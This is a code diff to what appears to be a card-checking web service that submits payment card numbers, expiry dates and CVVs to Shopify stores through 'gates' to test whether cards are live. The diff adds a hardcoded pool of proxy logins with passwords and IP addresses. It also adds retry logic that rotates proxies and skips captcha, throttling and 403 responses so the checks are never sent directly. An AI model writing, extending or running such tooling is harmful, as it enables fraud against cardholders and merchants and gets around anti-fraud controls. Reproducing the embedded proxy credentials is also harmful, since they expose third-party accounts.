@@ -385,7 +385,7 @@ def sh2_check():
     t0 = time.time()
     fut = _sh2_exec.submit(_sh2_run, cc, site, proxy, variant)
     try:
-        res = fut.result(timeout=150)
+        res = fut.result(timeout=300)
     except concurrent.futures.TimeoutError:
         fut.cancel()
         return jsonify({"error": "shopify check timed out"}), 504
@@ -414,12 +414,65 @@ def sh2_check():
         "timetaken": f"{time.time()-t0:.1f}s",
     })
 
+_SH2_PROXY_POOL = [
+    "3dfw7c6x:oSeqx0CNeV0k@103.183.121.128:58122",
+    "azqdr5vn:71WCPuMwyc72@103.183.121.211:11657",
+    "y7g4dd8d:Buw96jtGFKA5@103.183.121.59:34219",
+    "zqrn9y5d:zQRN9y5d@103.156.91.173:58798",
+    "dz46cabj:ksuRcKlNqJMU@103.161.113.230:18491",
+    "RrkJjUqfT:jYEH6Emdg@82.117.94.14:63126",
+    "1DnugnypC:4yPtzMd3f@193.254.17.97:64708",
+    "nWtrJqsb:RYYEE72Y@194.33.9.114:64170",
+    "nWtrJqsb:RYYEE72Y@194.33.9.136:49520",
+    "oldg6k2r:oLdG6k2R@135.148.117.75:59813",
+    "fwos7n0b:fWOS7n0B@51.195.198.170:36647",
+    "nWtrJqsb:RYYEE72Y@45.145.162.63:58536",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@au-syd.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@se-got.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@is-rey.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@at-wie.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@de-ber.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@th-ban.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ca-mon.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@id-jak.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@pl-tor.pvdata.host:8080",
+    "naveed:Qwerty_123ABC@103.204.108.142:12345",
+    "naveed:Qwerty_123ABC@196.244.48.124:12345",
+]
+
+_SH2_RETRY_VERDICTS = (
+    "CAPTCHA_REQUIRED", "Site not supported", "Proxy Error",
+    "Site Error! Status: 403", "Failed to get session token",
+    "Invalid JSON", "Change Proxy or Site", "Throttled", "Cart failed",
+)
+
 def _sh2_run(cc, site, proxy, variant):
     from gates.shopify_v2 import process_card as _sh2pc
     import asyncio as _aio
+    import random as _rnd
     parts = cc.split("|")
     ccn, mm, yy, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
-    return _aio.run(_sh2pc(ccn, mm, yy, cvv, site, variant, proxy or None))
+    # never direct: user proxy first (if given), then pool proxies, max 3 attempts
+    proxies = []
+    if proxy:
+        proxies.append(proxy)
+    pool = _SH2_PROXY_POOL[:]
+    _rnd.shuffle(pool)
+    proxies.extend(pool)
+    proxies = proxies[:3]
+    last = (False, "Unknown", "UNKNOWN", "0", "USD")
+    for px in proxies:
+        try:
+            res = _aio.run(_sh2pc(ccn, mm, yy, cvv, site, variant, px))
+        except Exception as e:
+            last = (False, f"Proxy Error: {type(e).__name__}: {str(e)[:60]}", "UNKNOWN", "0", "USD")
+            continue
+        last = res
+        msg = str(res[1])
+        if any(bad in msg for bad in _SH2_RETRY_VERDICTS):
+            continue
+        return res
+    return last
 
 
 # ─── Xonic Unified Gateway — root listing + per-gate health tracking ───
